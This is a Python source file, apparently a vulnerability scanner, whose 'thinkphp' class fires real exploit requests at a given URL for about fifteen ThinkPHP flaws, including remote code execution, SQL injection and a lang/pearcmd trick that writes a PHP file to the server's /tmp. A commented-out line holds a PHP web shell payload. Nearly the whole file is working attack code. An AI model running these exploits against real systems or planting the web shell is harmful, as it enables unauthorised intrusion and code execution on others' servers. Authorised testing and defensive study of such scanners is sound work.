#!/usr/bin/env python
# -*- coding: utf-8 -*-

import datetime
import urllib
import requests
import re
from urllib.parse import urlparse
from datetime import date, timedelta

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class thinkphp:

    def __init__(self):
        pass

    def ALL(self,args):
        self.url=args
        self.results=[]
        self.results.append(self.url)
        self.thinkphp2_rce()
        self.thinkphp3_rce()
        self.thinkphp_5022_rce()
        self.thinkphp_5023_rce()
        self.Lang()
        self.thinkphp5_sqli()
        self.thinkphp_driver_display_rce()
        self.thinkphp_index_construct_rce()
        self.thinkphp_index_showid_rce()
        self.thinkphp_invoke_func_code_exec()
        self.thinkphp_lite_code_exec()
        self.thinkphp_method_filter_code_exec()
        self.thinkphp_multi_sql_leak()
        self.thinkphp_pay_orderid_sqli()
        self.thinkphp_request_input_rce()
        self.thinkphp_view_recent_xff_sqli()
        return self.results




    def Lang(self):
        poc1 = '/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php'
        poc2 = '/index.php'
        #poc3 = "/index.php?+config-create+/<?=@eval($_POST['pass'])?>+/tmp/shell.php"

        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd',
            'Cookie': 'think_lang=zh-cn',
        }

        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'think-lang': '../../../../../../../../tmp/hello',
            'Cookie': 'think_lang=zh-cn',
        }
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'think_lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fshell',
            'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd'
        }
        url1 = self.url + poc1
        url2 = (self.url + poc2).encode("utf-8")
        try:

            requests.get(url=url1, headers=headers1, timeout=4)
            res2 = requests.get(url2, headers=headers2, verify=False)
            if 'Version' in res2.text:
                self.results.append("存在lang-rce")
        except:
            pass
            pass


    def thinkphp2_rce(self):
        relsult = {
            'name': 'Thinkphp 2.x rce',
            'vulnerable': False,
            'attack': True,
        }
        try:
            payload = urllib.parse.urljoin(self.url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
            response = requests.get(payload, timeout=3)
            if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
                self.results.append('Thinkphp 2.x rce')

        except:
            pass

    def thinkphp3_rce(self):
        relsult = {
            'name': 'ThinkPHP3.2.x 远程代码执行',
            'vulnerable': False,
            'attack': True,
        }
        url_1 = self.url + '/index.php?m=--><?=md5(1);?>'
        headers = {

            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cookie': 'PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;',
            'Upgrade-Insecure-Requests': '1'
        }
        try:
            oH = urlparse(self.url)
            a = oH.netloc.split(':')
            port = 80
            if 2 == len(a):
                port = a[1]
            elif 'https' in oH.scheme:
                port = 443
            host = a[0]
            # with socket.create_connection((host, port), timeout=10) as conn:

            # conn.send(payload1)
            # req1 = conn.recv(10240).decode()
            s2 = requests.post(url_1, headers=headers)
            today = (date.today() + timedelta()).strftime("%y_%m_%d")
            payload2 = urllib.parse.urljoin(self.url,
                                            'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(
                                                today))
            req2 = requests.get(payload2, timeout=3)
            if re.search(r'c4ca4238a0b923820dcc509a6f75849b', req2.text):
                self.results.append('ThinkPHP3.2.x 远程代码执行')

        except:
            pass

    def thinkphp_5022_rce(self):
        relsult = {
            'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
            'vulnerable': False,
            'attack': True,
        }
        try:
            payload = urllib.parse.urljoin(self.url,
                                           r'''/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1''')
            response = requests.get(payload, timeout=3, verify=False)
            if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
                self.results.append('Thinkphp5 5.0.22/5.1.29 Remote Code Execution')

        except:
            pass

    def thinkphp_5023_rce(self):
        relsult = {
            'name': 'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
            'vulnerable': False,
            'attack': True,
        }
        try:
            target = self.url + '/index.php?s=captcha'
            target = urllib.parse.urljoin(self.url, '/index.php?s=captcha')
            payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            response = requests.post(target, data=payload, timeout=3, verify=False, headers=headers)
            response2 = requests.post(target, timeout=3, verify=False, headers=headers)
            if re.search(r'PHP Version', response.text) and not re.search(r'PHP Version', response2.text):
                self.results.append('Thinkphp5 5.0.22/5.1.29 Remote Code Execution||POST')

        except:
            pass

    def thinkphp5_sqli(self):
        relsult = {
            'name': 'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability',
            'vulnerable': False
        }
        try:
            payload = urllib.parse.urljoin(self.url, '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1')
            response = requests.get(payload, timeout=3, verify=False)
            if re.search(r'XPATH syntax error', response.text):
                self.results.append('ThinkPHP5 SQL Injection Vulnerability')

        except:
            pass




    def thinkphp_driver_display_rce(self):
        relsult = {
            'name': 'thinkphp_driver_display_rce',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        try:
            vurl = urllib.parse.urljoin(self.url,
                                        'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                self.results.append('thinkphp_driver_display_rce')

        except:
            pass


    def thinkphp_index_construct_rce(self):
        relsult = {
            'name': 'thinkphp_index_construct_rce',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            "Content-Type": "application/x-www-form-urlencoded",
        }
        payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump'
        try:
            vurl = urllib.parse.urljoin(self.url, 'index.php?s=index/index/index')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
            if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
                self.results.append('thinkphp_index_construct_rce')

        except:
            pass


    def thinkphp_index_showid_rce(self):
        relsult = {
            'name': 'thinkphp_index_showid_rce',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        try:
            vurl = urllib.parse.urljoin(self.url,
                                        'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
            vurl2 = urllib.parse.urljoin(self.url,
                                         'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
            req2 = requests.get(vurl2, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req2.text:
                self.results.append('thinkphp_index_showid_rce')

        except:
            pass


    def thinkphp_invoke_func_code_exec(self):
        relsult = {
            'name': 'thinkphp_invoke_func_code_exec',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        controllers = list()
        try:
            req = requests.get(self.url, headers=headers, timeout=15, verify=False)
        except:
            return relsult
        pattern = '<a[\\s+]href="/[A-Za-z]+'
        matches = re.findall(pattern, req.text)
        for match in matches:
            controllers.append(match.split('/')[1])
        controllers.append('index')
        controllers = list(set(controllers))
        for controller in controllers:
            try:
                payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(
                    controller)
                vurl = urllib.parse.urljoin(self.url, payload)
                req = requests.get(vurl, headers=headers, timeout=15, verify=False)
                if r"56540676a129760a3" in req.text:
                    self.results.append('thinkphp_invoke_func_code_exec')

            except:
                pass


    def thinkphp_lite_code_exec(self):
        relsult = {
            'name': 'thinkphp_lite_code_exec',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        try:
            payload = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
            vurl = urllib.parse.urljoin(self.url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req.text:
                self.results.append('thinkphp_lite_code_exec')

        except:
            pass


    def thinkphp_method_filter_code_exec(self):
        relsult = {
            'name': 'thinkphp_method_filter_code_exec',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        payload = {
            'c': 'var_dump',
            'f': '4e5e5d7364f443e28fbf0d3ae744a59a',
            '_method': 'filter',
        }
        try:
            vurl = urllib.parse.urljoin(self.url, 'index.php')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
            if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
                self.results.append('thinkphp_method_filter_code_exec')

        except:
            pass


    def thinkphp_multi_sql_leak(self):
        relsult = {
            'name': 'thinkphp_multi_sql_leak',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        payloads = [
            r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
            r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
            r'index.php?s=/home/user/cut/id/1%27',
            r'index.php?s=/home/service/index/id/1%27',
            r'index.php?s=/home/pay/chongzhi/orderid/1%27',
            r'index.php?s=/home/order/complete/id/1%27',
            r'index.php?s=/home/order/detail/id/1%27',
            r'index.php?s=/home/order/cancel/id/1%27',
        ]
        try:
            for payload in payloads:
                vurl = urllib.parse.urljoin(self.url, payload)
                req = requests.get(vurl, headers=headers, timeout=15, verify=False)
                if r"SQL syntax" in req.text:
                    self.results.append('thinkphp_multi_sql_leak')


        except:
            pass


    def thinkphp_pay_orderid_sqli(self):
        relsult = {
            'name': 'thinkphp_pay_orderid_sqli',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        try:
            vurl = urllib.parse.urljoin(self.url,
                                        'index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                self.results.append('thinkphp_pay_orderid_sqli')

        except:
            pass


    def thinkphp_request_input_rce(self):
        relsult = {
            'name': 'thinkphp_request_input_rce',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        try:
            vurl = urllib.parse.urljoin(self.url, 'index.php?s=index/\\think\Request/input&filter=phpinfo&data=1')
            req = requests.get(vurl, headers=headers, timeout=3, verify=False)
            req2 = requests.get(self.url, headers=headers, timeout=3, verify=False)
            if r"PHP Version" in req.text and r"PHP Version" not in req2.text:
                self.results.append('thinkphp_request_input_rce')

        except:
            pass


    def thinkphp_view_recent_xff_sqli(self):
        relsult = {
            'name': 'thinkphp_view_recent_xff_sqli',
            'vulnerable': False
        }
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            "X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
        }
        try:
            vurl = urllib.parse.urljoin(self.url, 'index.php?s=/home/article/view_recent/name/1')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                self.results.append('thinkphp_view_recent_xff_sqli')

        except:
            pass


    def get_time(self):
        return datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")


    def get_methods(self):
        return (list(filter(lambda m: not m.startswith("_") and callable(getattr(self, m)), dir(self))))


